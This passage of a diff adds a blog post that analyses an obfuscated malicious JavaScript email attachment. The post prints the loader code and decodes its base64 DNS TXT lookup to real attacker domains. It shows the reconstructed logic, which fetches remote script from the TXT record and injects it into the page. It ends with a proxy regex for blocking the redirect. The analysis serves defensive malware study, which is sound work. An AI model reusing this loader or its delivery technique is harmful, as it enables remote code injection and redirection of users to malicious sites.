+        <span class="kd">var</span> <span class="nx">_0x47b474</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">_0x5c32a3</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="nx">_0x5c32a3</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">_0x532510</span><span class="p">[</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0xc&#39;</span><span class="p">)](</span><span class="nx">_0x532510</span><span class="p">[</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0xd&#39;</span><span class="p">)]());</span>
+            <span class="p">}</span>
+        <span class="p">};</span>
+        <span class="nx">_0x47b474</span><span class="p">(</span><span class="o">++</span><span class="nx">_0x26a9cf</span><span class="p">);</span>
+    <span class="p">}(</span><span class="nx">_0x3bf9f2</span><span class="p">,</span> <span class="mh">0x1b2</span><span class="p">));</span>
+    <span class="kd">var</span> <span class="nx">_0x58060d</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">_0x13b5d5</span><span class="p">,</span> <span class="nx">_0x174409</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">_0x13b5d5</span> <span class="o">=</span> <span class="nx">_0x13b5d5</span> <span class="o">-</span> <span class="mh">0x0</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">_0x1aae1c</span> <span class="o">=</span> <span class="nx">_0x3bf9f2</span><span class="p">[</span><span class="nx">_0x13b5d5</span><span class="p">];</span>
+        <span class="k">return</span> <span class="nx">_0x1aae1c</span><span class="p">;</span>
+    <span class="p">};</span>
+    <span class="kd">var</span> <span class="nx">_0x48f014</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">_0x48f014</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0xe&#39;</span><span class="p">))](</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0xf&#39;</span><span class="p">)),</span> <span class="nx">v</span><span class="p">);</span>
+    <span class="nx">_0x48f014</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x10&#39;</span><span class="p">))]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">_0x48f014</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x11&#39;</span><span class="p">))]</span> <span class="o">==</span> <span class="mh">0xc8</span> <span class="o">&amp;&amp;</span> <span class="nx">_0x48f014</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x12&#39;</span><span class="p">))]</span> <span class="o">==</span> <span class="mh">0x4</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">_0x45edda</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x13&#39;</span><span class="p">))](</span><span class="nx">_0x48f014</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x14&#39;</span><span class="p">))]);</span>
+            <span class="kd">var</span> <span class="nx">_0x2e08f9</span> <span class="o">=</span> <span class="nx">_0x45edda</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x15&#39;</span><span class="p">))][</span><span class="mh">0x0</span><span class="p">][</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x16&#39;</span><span class="p">)];</span>
+            <span class="kd">var</span> <span class="nx">_0x599d3c</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x17&#39;</span><span class="p">))](</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x18&#39;</span><span class="p">)));</span>
+            <span class="nx">_0x599d3c</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x19&#39;</span><span class="p">))]</span> <span class="o">=</span> <span class="nx">_0x2e08f9</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x1a&#39;</span><span class="p">))](</span><span class="mh">0x1</span><span class="p">,</span> <span class="nx">_0x2e08f9</span><span class="p">[</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x1b&#39;</span><span class="p">)]</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">);</span>
+            <span class="nb">document</span><span class="p">[</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x1c&#39;</span><span class="p">)][</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x1d&#39;</span><span class="p">))](</span><span class="nx">_0x599d3c</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="nx">_0x48f014</span><span class="p">[</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="s1">&#39;0xd&#39;</span><span class="p">)]();</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Carefully save this script to a new malicious.js file on the sandbox for later.</p>
+<p>The following lines jump out after a quick review:</p>
+<ol>
+<li>Line 1 contains a BASE64 string</li>
+<li>Line 2 an array of functions that are likely called in the code</li>
+<li>Line 32 XMLHttpRequest</li>
+</ol>
+<p>Using <a href="https://gchq.github.io/CyberChef/">CyberChef</a> Line 1 is decoded to:</p>
+<div class="highlight"><pre><span></span><code>https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&amp;type=TXT
+</code></pre></div>
+<p>This is a URL for google's DNS lookup service.  More specifically it is doing a lookup for a TXT DNS record for subdomain fetch.slzxkcee.glamisbound.com.</p>
+<p>Doing this lookup from the sandbox returns the following JSON response:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;Status&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="nt">&quot;TC&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span><span class="nt">&quot;RD&quot;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span><span class="nt">&quot;RA&quot;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span><span class="nt">&quot;AD&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span><span class="nt">&quot;CD&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+<span class="nt">&quot;Question&quot;</span><span class="p">:[</span> <span class="p">{</span><span class="nt">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;fetch.slzxkcee.glamisbound.com.&quot;</span><span class="p">,</span><span class="nt">&quot;type&quot;</span><span class="p">:</span> <span class="mi">16</span><span class="p">}],</span>
+<span class="nt">&quot;Answer&quot;</span><span class="p">:[</span> <span class="p">{</span><span class="nt">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;fetch.slzxkcee.glamisbound.com.&quot;</span><span class="p">,</span>
+<span class="nt">&quot;type&quot;</span><span class="p">:</span> <span class="mi">16</span><span class="p">,</span><span class="nt">&quot;TTL&quot;</span><span class="p">:</span> <span class="mi">119</span><span class="p">,</span>
+<span class="nt">&quot;data&quot;</span><span class="p">:</span> <span class="s2">&quot;\&quot;window.location.replace(\&quot;http://www.67595bfg36abp.multiproinvest.com/80999.html\&quot;);\&quot;&quot;</span><span class="p">}],</span>
+<span class="nt">&quot;Comment&quot;</span><span class="p">:</span> <span class="s2">&quot;Response from 104.193.252.177.&quot;</span><span class="p">}</span>
+</code></pre></div>
+<p>Each time this lookup is done, the server responds with a different answer which contains a different URL.</p>
+<p>The TTL is set to 119 seconds, which means the DNS servers will only cache the request for under 2 min.  </p>
+<p>The data field contains JavaScript code and a URL.  Lets see what the Javascript code does [5]:</p>
+<blockquote>
+<p>The Location.replace() method replaces the current resource with the one at the provided URL. The difference from the assign() method is that after using replace() the current page will not be saved in session History, meaning the user won't be able to use the back button to navigate to it.</p>
+</blockquote>
+<p>At this point we can make an educated guess what the original malicious attachment is doing.  It's probably doing a DNS TXT lookup to obtain the second malicious domain.  It then redirects the user to this domain.</p>
+<p>However, to be sure we need to deobfuscate rest of the script.  Lets continue...</p>
+<h3 id="javascript-deobfuscation">JavaScript Deobfuscation<a class="headerlink" href="#javascript-deobfuscation" title="Permanent link">&para;</a></h3>
+<p>One of my favorite tools for JS deobfuscation is <a href="https://blog.didierstevens.com/programs/spidermonkey/">SpiderMonkey</a> by Didier Stevens.</p>
+<p>Here is what it does [6]:</p>
+<blockquote>
+<p>SpiderMonkey is a modified version of Mozilla’s C implementation of JavaScript, with some extra functions to help with malware analysis.</p>
+<p>Additional functionality:</p>
+<p>document.write
+eval(arg) writes arg to a file
+window.navigate</p>
+</blockquote>
+<p>We're going to use <code>document.write</code> and SpiderMonkey to deobfuscate this script.</p>
+<p>Going back to the original attaachment, Line 9 is shown here:</p>
+<div class="highlight"><pre><span></span><code>&lt;script src=&quot;https://accounts.google.com/o/oauth2/revoke?callback=ccc()&quot; type=&quot;text/javascript&quot; xml:space=&quot;preserve&quot;&gt;&lt;/script&gt;
+</code></pre></div>
+<p>This line is a tricky way to call the <code>ccc()</code> function in the malicious.js.  We will need to call ccc() to simulate the original attachment.  This can be done but adding ccc() to the bottom of malicious.js.</p>
+<p>Lets run the script in the sandbox with SpiderMonkey.  </p>
+<p>Here is the error message I received.</p>
+<div class="highlight"><pre><span></span><code>PS C:\Users\User\desktop\windows &gt; .\js-file .\malicious.js
+.\malicious.js:1: TypeError: window.atob is not a function
+</code></pre></div>
+<p>You will see errors like this with SpiderMonkey.  As we're not running the JavaScript in a browser, we need to modify the code a little bit.</p>
+<p>Here is what <code>windows.atob</code> does [7]:</p>
+<blockquote>
+<p>Decode a base-64 encoded string</p>
+</blockquote>
+<p>Lets replace line 1 of .\malicious.js with the decoded value of the string.</p>
+<p><div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">v</span> <span class="o">=</span> <span class="s2">&quot;https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&amp;type=TXT&quot;</span><span class="p">;</span>
+</code></pre></div>
+Running the script again gives an error message about "XMLHttpRequest".  This is fine, we know that most of the script is running now.  There are no output or write.log to know what this script does.  </p>
+<p>Beware at this point your VM may be infected.  Depending on what you're analyzing and whether the sandbox is connected to the internet or not, you may want to restart your Sandbox (from a clean snapshot).</p>
+<p>Lets add some <code>document.write</code> to the script to figure out what the script is doing.  By adding these <code>document.write</code> and using SpiderMonkey, we can dump the obfuscated strings to 'write.log' file.  Using this method, we will be able to deobfuscate the script.</p>
+<p>Here is some of the <code>document.write</code> that I added to the script (more specifically prior to the "XMLHttpRequest()" function):</p>
+<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;XMLHttpRequest =&gt; &quot;</span><span class="o">+</span> <span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0xe&#39;</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="p">(</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0xf&#39;</span><span class="p">)))</span>  <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="nx">v</span>  <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x10&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x10&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x11&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x11&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x12&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x12&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x13&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x13&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x14&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x14&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x15&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x15&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58f7(&#39;0x16&#39;)): &quot;</span> <span class="o">+</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x16&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x17)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x17&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x18&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x18&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x19&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x19&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x1a&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x1a&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58f7(&#39;0x1b&#39;): &quot;</span> <span class="o">+</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x1b&#39;</span><span class="p">)</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58f7(&#39;0x1c&#39;): &quot;</span> <span class="o">+</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x1c&#39;</span><span class="p">)</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(_0x58f7(&#39;0x1d&#39;)): &quot;</span> <span class="o">+</span><span class="nx">_0x58060d</span><span class="p">(</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x1d&#39;</span><span class="p">))</span><span class="o">+</span> <span class="s2">&quot;\n&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;_0x58060d(&#39;0xd&#39;): &quot;</span> <span class="o">+</span> <span class="nx">_0x58060d</span><span class="p">(</span><span class="s1">&#39;0xd&#39;</span><span class="p">)</span> <span class="p">);</span>
+</code></pre></div>
+<p>Here is the partial content of write.log after running the script with SpiderMonkey:</p>
+<div class="highlight"><pre><span></span><code>XMLHttpRequest =&gt; open GET https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&amp;type=TXT
+_0x58f7: Input: 16,undefined, output:0x2
+_0x58060d: Input: 2,undefined, output:onreadystatechange
+_0x58060d(_0x58f7(&#39;0x10&#39;)): onreadystatechange
+_0x58f7: Input: 17,undefined, output:0x3
+_0x58060d: Input: 3,undefined, output:status
+_0x58060d(_0x58f7(&#39;0x11&#39;)): status
+_0x58f7: Input: 18,undefined, output:0x4
+_0x58060d: Input: 4,undefined, output:readyState
+_0x58060d(_0x58f7(&#39;0x12&#39;)): readyState
+_0x58f7: Input: 19,undefined, output:0x5
+_0x58060d: Input: 5,undefined, output:parse
+_0x58060d(_0x58f7(&#39;0x13&#39;)): parse
+_0x58f7: Input: 20,undefined, output:0x6
+_0x58060d: Input: 6,undefined, output:responseText
+_0x58060d(_0x58f7(&#39;0x14&#39;)): responseText
+_0x58f7: Input: 21,undefined, output:0x7
+_0x58060d: Input: 7,undefined, output:Answer
+_0x58060d(_0x58f7(&#39;0x15&#39;)): Answer
+_0x58f7: Input: 22,undefined, output:data
+_0x58f7(&#39;0x16&#39;)): data
+_0x58f7: Input: 23,undefined, output:0x8
+_0x58060d: Input: 8,undefined, output:createElement
+_0x58060d(_0x58f7(&#39;0x17)): createElement
+_0x58f7: Input: 24,undefined, output:0x9
+_0x58060d: Input: 9,undefined, output:script
+_0x58060d(_0x58f7(&#39;0x18&#39;)): script
+_0x58f7: Input: 25,undefined, output:0xa
+_0x58060d: Input: 10,undefined, output:innerHTML
+_0x58060d(_0x58f7(&#39;0x19&#39;)): innerHTML
+_0x58f7: Input: 26,undefined, output:0xb
+_0x58060d: Input: 11,undefined, output:substring
+_0x58060d(_0x58f7(&#39;0x1a&#39;)): substring
+_0x58f7: Input: 27,undefined, output:length
+_0x58f7(&#39;0x1b&#39;): length
+_0x58f7: Input: 28,undefined, output:body
+_0x58f7(&#39;0x1c&#39;): c
+_0x58f7: Input: 29,undefined, output:0xc
+_0x58060d: Input: 12,undefined, output:appendChild
+_0x58060d(_0x58f7(&#39;0x1d&#39;)): appendChild
+_0x58060d: Input: 13,undefined, output:send
+_0x58060d(&#39;0xd&#39;): send
+</code></pre></div>
+<p>Replacing the obfuscated strings with the deobfuscate strings and renaming the variables gives the following:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">XMLHTTP</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">XMLHTTP</span><span class="p">[</span><span class="nx">Open</span><span class="p">](</span><span class="nx">Get</span><span class="p">),</span> <span class="s2">&quot;https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&amp;type=TXT&quot;</span><span class="p">;</span>
+<span class="nx">XMLHTTP</span><span class="p">[</span><span class="nx">onreadystatechange</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">XMLHTTP</span><span class="p">[</span><span class="nx">status</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xc8</span> <span class="o">&amp;&amp;</span> <span class="nx">XMLHTTP</span><span class="p">[</span><span class="nx">readyState</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">responseTextString</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">[</span><span class="nx">parse</span><span class="p">](</span><span class="nx">XMLHTTP</span><span class="p">[</span><span class="nx">responseText</span><span class="p">]);</span>
+        <span class="kd">var</span> <span class="nx">dataString</span> <span class="o">=</span> <span class="nx">responseTextString</span><span class="p">[</span><span class="nx">Answer</span><span class="p">][</span><span class="mh">0x0</span><span class="p">][</span><span class="nx">data</span><span class="p">];</span>
+        <span class="kd">var</span> <span class="nx">HTMLDocument</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="nx">createElement</span><span class="p">](</span><span class="nx">script</span><span class="p">);</span>
+        <span class="nx">HTMLDocument</span><span class="p">[</span><span class="nx">innerHTML</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dataString</span><span class="p">[</span><span class="nx">substring</span><span class="p">](</span><span class="mh">0x1</span><span class="p">,</span> <span class="nx">dataString</span><span class="p">[</span><span class="nx">length</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">);</span>            
+        <span class="nb">document</span><span class="p">[</span><span class="nx">length</span><span class="p">][</span><span class="nx">appendChild</span><span class="p">](</span><span class="nx">HTMLDocument</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="nx">XMLHTTP</span><span class="p">[</span><span class="nx">send</span><span class="p">]();</span>
+</code></pre></div>
+<p>This verifies our educated guess from earlier.</p>
+<h3 id="blocking-the-script">Blocking the Script<a class="headerlink" href="#blocking-the-script" title="Permanent link">&para;</a></h3>
+<p>There are different ways to block the script.  One way is to block the initial DNS lookup.  Another way is to block the second domain.  I looked at number of the DNS TXT responses and at the moment there seems to be a pattern in the responses.</p>
+<p>The second domain can be blocked by a web proxy, using the following Regex:</p>
+<div class="highlight"><pre><span></span><code>\d{5}bfg36abp\..*\.\w{3}\/\d{5}\.html\\
+</code></pre></div>
+<h2 id="conclusion">Conclusion<a class="headerlink" href="#conclusion" title="Permanent link">&para;</a></h2>
+<p>This article described how you can deobfucate a malicious JavaScript code.  The malware authors could have done better hiding the DNS lookup.  They used a simple BASE64 encoding to hide the lookup.  It's always enjoyable to deobfucate a script to see how it works.  If you have any comments/feedback, send them to me via twitter.</p>
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<ol>
+<li><a href="https://myonlinesecurity.co.uk/it-looks-like-another-dns-compromise-hack-happening/">https://myonlinesecurity.co.uk/it-looks-like-another-dns-compromise-hack-happening/</a></li>
+<li><a href="https://www.bleepingcomputer.com/news/security/new-spam-campaign-controlled-by-attackers-via-dns-txt-records/">https://www.bleepingcomputer.com/news/security/new-spam-campaign-controlled-by-attackers-via-dns-txt-records/</a></li>
+<li><a href="https://stackoverflow.com/questions/51464972/xmlspace-preserve-effect-on-space-between-xml-attributes">https://stackoverflow.com/questions/51464972/xmlspace-preserve-effect-on-space-between-xml-attributes</a></li>
+<li><a href="https://www.tutorialspoint.com/xml/xml_cdata_sections.htm">https://www.tutorialspoint.com/xml/xml_cdata_sections.htm</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Location/replace">https://developer.mozilla.org/en-US/docs/Web/API/Location/replace</a></li>
+<li><a href="https://blog.didierstevens.com/programs/spidermonkey/">SpiderMonkey</a></li>
+<li><a href="https://www.w3schools.com/jsref/met_win_atob.asp">https://www.w3schools.com/jsref/met_win_atob.asp</a></li>
+</ol>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../../kringlecon2/2020-01-13-KringleCon2/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                KringleCon 2
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../../post2/2019-04-22-HowToSignUpForHackTheBox/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                How to Sign Up for Hack The Box
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../assets/javascripts/vendor.08c56446.min.js"></script>
+      <script src="../../../../assets/javascripts/bundle.6ced434e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../../..",
+          features: ['navigation.instant'],
+          search: Object.assign({
+            worker: "../../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
